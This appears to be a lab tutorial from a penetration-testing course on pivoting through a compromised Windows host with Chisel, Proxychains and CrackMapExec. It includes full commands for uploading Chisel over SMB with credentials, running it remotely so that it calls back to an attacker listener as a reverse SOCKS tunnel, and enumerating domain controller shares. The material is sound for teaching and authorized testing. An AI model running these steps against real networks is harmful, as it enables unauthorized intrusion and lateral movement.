# Proxychains with CME

In the module [Pivoting, Tunneling, and Port Forwarding](https://academy.hackthebox.com/module/details/158/), we discussed how to use tools such as Chisel & Proxychains to connect to networks to that we don't have direct access to. This section will revisit the concept to understand how we can attack other networks via a compromised host.

***

## Scenario

We are working on an internal Pentest. We performed a network scan and identified and compromised only one host (10.129.204.133). By running `ipconfig` on this compromised host, we notice it has two network adapters. Its ARP table shows another host with the IP address 172.16.1.10. Based on the information we collected, we have the following scenario:

<figure><img src="../../../../.gitbook/assets/image (555).png" alt=""><figcaption></figcaption></figure>

To attack DC01 and any other machine in that network (172.16.1.0/24), we must set up a tunnel between our attack host and MS01. Therefore, all commands executed by CME go through MS01.

***

## Set Up the Tunnel

We will use [Chisel](https://github.com/jpillora/chisel) to set up our tunnel. Let's navigate to [release](https://github.com/jpillora/chisel/releases) and download the latest Windows binary for our compromised machine and the newest Linux binary to use on our attack host and perform the following steps:

1. Download and Run Chisel on our Attack Host:

### **Chisel - Reverse Tunnel**

```shell-session
al1abb@htb[/htb]$ wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz -O chisel.gz -q
al1abb@htb[/htb]$ gunzip -d chisel.gz
al1abb@htb[/htb]$ chmod +x chisel
al1abb@htb[/htb]$ ./chisel server --reverse

2022/11/06 10:57:00 server: Reverse tunnelling enabled
2022/11/06 10:57:00 server: Fingerprint CelKxt2EsL1SUFnvo634FucIOPqlFKQJi8t/aTjRfWo=
2022/11/06 10:57:00 server: Listening on http://0.0.0.0:8080
```

2. Download and Upload Chisel for Windows to the Target Host:

### **Upload Chisel**

```shell-session
al1abb@htb[/htb]$ wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_windows_amd64.gz -O chisel.exe.gz -q
al1abb@htb[/htb]$ gunzip -d chisel.exe.gz
al1abb@htb[/htb]$ crackmapexec smb 10.129.204.133 -u grace -p Inlanefreight01! --put-file ./chisel.exe \\Windows\\Temp\\chisel.exe 

SMB         10.129.204.133  445    MS01             [*] Windows 10.0 Build 17763 x64 (name:MS01) (domain:inlanefreight.htb) (signing:False) (SMBv1:False)
SMB         10.129.204.133  445    MS01             [+] inlanefreight.htb\grace:Inlanefreight01! (Pwn3d!)
SMB         10.129.204.133  445    MS01             [*] Copy ./chisel.exe to \Windows\Temp\chisel.exe
SMB         10.129.204.133  445    MS01             [+] Created file ./chisel.exe on \\C$\\Windows\Temp\chisel.exe
```

3. Execute `chisel.exe` to connect to our Chisel server using the CrackMapExec command execution option `-x` (We will discuss this option more in the [Command Execution](https://academy.hackthebox.com/module/84/section/812) section)

### **Connect to the Chisel Server**

```shell-session
$ crackmapexec smb 10.129.204.133 -u grace -p Inlanefreight01! -x "C:\Windows\Temp\chisel.exe client 10.10.14.33:8080 R:socks"

SMB         10.129.204.133  445    MS01             [*] Windows 10.0 Build 17763 x64 (name:MS01) (domain:inlanefreight.htb) (signing:False) (SMBv1:False)
SMB         10.129.204.133  445    MS01             [+] inlanefreight.htb\grace:Inlanefreight01! (Pwn3d!)
```

The command in this terminal will finish once we stop the Chisel process in the target machine. We will do this later in this section.

In our attack host, we should notice a new line on the Chisel server indicating that we received a connection from a client and initiated our tunnel.

### **Chisel Receiving Session No. 1**

```shell-session
$ ./chisel server --reverse 

<SNIP>

2022/11/06 10:57:54 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```

We can also confirm the tunnel is running by checking if port TCP 1080 is listening:

### **Check Listening Port**

```shell-session
$ netstat -lnpt | grep 1080

(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
tcp        0      0 127.0.0.1:1080          0.0.0.0:*               LISTEN      446306/./chisel
```

5. We need to configure `proxychains` to use the Chisel default port TCP 1080. We need to make sure to include `socks5 127.0.0.1 1080` in the ProxyList section of the configuration file as follows:

### **Configure Proxychains**

```shell-session
$ cat /etc/proxychains.conf

<SNIP>

[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks5  127.0.0.1 1080
```

6. We can now use CrackMapExec through Proxychains to reach the IP 172.16.1.10:

### **Testing CrackMapExec via Proxychains**

```shell-session
$ proxychains crackmapexec smb 172.16.1.10 -u grace -p Inlanefreight01! --shares

[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.10:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.10:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.10:135  ...  OK
SMB         172.16.1.10     445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.10:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.10:445  ...  OK
SMB         172.16.1.10     445    DC01             [+] inlanefreight.htb\grace:Inlanefreight01! 
SMB         172.16.1.10     445    DC01             [+] Enumerated shares
SMB         172.16.1.10     445    DC01             Share           Permissions     Remark
SMB         172.16.1.10     445    DC01             -----           -----------     ------
SMB         172.16.1.10     445    DC01             ADMIN$          READ            Remote Admin
SMB         172.16.1.10     445    DC01             C$              READ,WRITE      Default share
SMB         172.16.1.10     445    DC01             carlos                          
SMB         172.16.1.10     445    DC01             D$              READ,WRITE      Default share
SMB         172.16.1.10     445    DC01             david                           
SMB         172.16.1.10     445    DC01             IPC$            READ            Remote IPC
SMB         172.16.1.10     445    DC01             IT              READ,WRITE      
SMB         172.16.1.10     445    DC01             john                            
SMB         172.16.1.10     445    DC01             julio                           
SMB         172.16.1.10     445    DC01             linux01         READ,WRITE      
SMB         172.16.1.10     445    DC01             NETLOGON        READ            Logon server share 
SMB         172.16.1.10     445    DC01             svc_workstations                 
SMB         172.16.1.10     445    DC01             SYSVOL          READ            Logon server share
```

To remove Proxychains output from the console, we can use `Proxychains4` and the quiet option `-q`:

### **Proxychains4 with Quiet Option**

```shell-session
$ proxychains4 -q crackmapexec smb 172.16.1.10 -u grace -p Inlanefreight01! --shares

SMB         172.16.1.10     445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
SMB         172.16.1.10     445    DC01             [+] inlanefreight.htb\grace:Inlanefreight01! 
SMB         172.16.1.10     445    DC01             [+] Enumerated shares
SMB         172.16.1.10     445    DC01             Share           Permissions     Remark
SMB         172.16.1.10     445    DC01             -----           -----------     ------
SMB         172.16.1.10     445    DC01             ADMIN$          READ            Remote Admin
SMB         172.16.1.10     445    DC01             C$              READ,WRITE      Default share
SMB         172.16.1.10     445    DC01             carlos                          
SMB         172.16.1.10     445    DC01             D$              READ,WRITE      Default share
SMB         172.16.1.10     445    DC01             david                           
SMB         172.16.1.10     445    DC01             IPC$            READ            Remote IPC
SMB         172.16.1.10     445    DC01             IT              READ,WRITE      
SMB         172.16.1.10     445    DC01             john                            
SMB         172.16.1.10     445    DC01             julio                           
SMB         172.16.1.10     445    DC01             linux01         READ,WRITE      
SMB         172.16.1.10     445    DC01             NETLOGON        READ            Logon server share 
SMB         172.16.1.10     445    DC01             svc_workstations                 
SMB         172.16.1.10     445    DC01             SYSVOL          READ            Logon server share
```

We can perform any CME action via Proxychains.

***

## Killing Chisel on the Target Machine

Once we have finished, we need to kill the Chisel process. To do this, we will use the option `-X` to execute PowerShell commands and run the PowerShell command `Stop-Process -Name chisel -Force`. We will discuss command execution in more detail in the [Command Execution](https://academy.hackthebox.com/module/84/section/812) section.

### **Kill the Chisel Client**

```shell-session
$ crackmapexec smb 10.129.204.133 -u grace -p Inlanefreight01! -X "Stop-Process -Name chisel -Force"

SMB         10.129.204.133  445    MS01             [*] Windows 10.0 Build 17763 x64 (name:MS01) (domain:inlanefreight.htb) (signing:False) (SMBv1:False)
SMB         10.129.204.133  445    MS01             [+] inlanefreight.htb\grace:Inlanefreight01! (Pwn3d!)
SMB         10.129.204.133  445    MS01             [+] Executed command
```

Once we do this, the terminal where we ran the Chisel client command execution should conclude as follows:

### **Terminal Ending After Forcing Chisel to Stop**

```shell-session
$ crackmapexec smb 10.129.204.133 -u grace -p Inlanefreight01! -x "C:\Windows\Temp\chisel.exe client 10.10.14.33:8080 R:socks"

SMB         10.129.204.133  445    MS01             [*] Windows 10.0 Build 17763 x64 (name:MS01) (domain:inlanefreight.htb) (signing:False) (SMBv1:False)
SMB         10.129.204.133  445    MS01             [+] inlanefreight.htb\grace:Inlanefreight01! (Pwn3d!)
SMB         10.129.204.133  445    MS01             [+] Executed command 
SMB         10.129.204.133  445    MS01             2022/11/07 06:26:10 client: Connecting to ws://10.10.14.33:8080
SMB         10.129.204.133  445    MS01             2022/11/07 06:26:11 client: Connected (Latency 125.6629ms)
```

We can now close the `Chisel server` on our attack host with `CTRL + C`.

### **Closing Chisel on Our Attack Host**

```shell-session
$ ./chisel server --reverse               
                                                 
2022/12/08 16:43:17 server: Reverse tunnelling enabled      
2022/12/08 16:43:17 server: Fingerprint NVnBjtu2DPIuQPxLU0YdcyZhRKc+Myi3ojPzo0T2frQ=
2022/12/08 16:43:17 server: Listening on http://0.0.0.0:8080
2022/12/08 16:44:21 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
^C
```

***

## Windows as the Server and Linux as the Client

We can also do the opposite by starting Chisel as a server on the Windows workstation and using our attack host as the client. To start Chisel as the server, we will use the option `server --socks5`.

### **Starting Chisel as the Server in the Target Machine**

```shell-session
$ crackmapexec smb 10.129.204.133 -u grace -p Inlanefreight01! -x "C:\Windows\Temp\chisel.exe server --socks5"

SMB         10.129.204.133  445    MS01             [*] Windows 10.0 Build 17763 x64 (name:MS01) (domain:inlanefreight.htb) (signing:False) (SMBv1:False)
SMB         10.129.204.133  445    MS01             [+] inlanefreight.htb\grace:Inlanefreight01! (Pwn3d!)
```

Now to connect to our target machine Chisel server and enable the proxy, we need to use the option `socks` after the IP and port.

### **Connecting to the Chisel Server from our Attack Host**

```shell-session
$ sudo chisel client 10.129.204.133:8080 socks

2022/11/22 06:56:01 client: Connecting to ws://10.129.204.133:8080
2022/11/22 06:56:01 client: tun: proxy#127.0.0.1:1080=>socks: Listening
2022/11/22 06:56:02 client: Connected (Latency 124.871246ms)
```

Now we can use Proxychains again:

### **Using Proxychains to Connect to the Internal Network**

```shell-session
$ proxychains4 -q crackmapexec smb 172.16.1.10 -u grace -p Inlanefreight01! --shares

SMB         172.16.1.10     445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
SMB         172.16.1.10     445    DC01             [+] inlanefreight.htb\grace:Inlanefreight01! 
SMB         172.16.1.10     445    DC01             [+] Enumerated shares
SMB         172.16.1.10     445    DC01             Share           Permissions     Remark
SMB         172.16.1.10     445    DC01             -----           -----------     ------
SMB         172.16.1.10     445    DC01             ADMIN$          READ            Remote Admin

<SNIP>
```
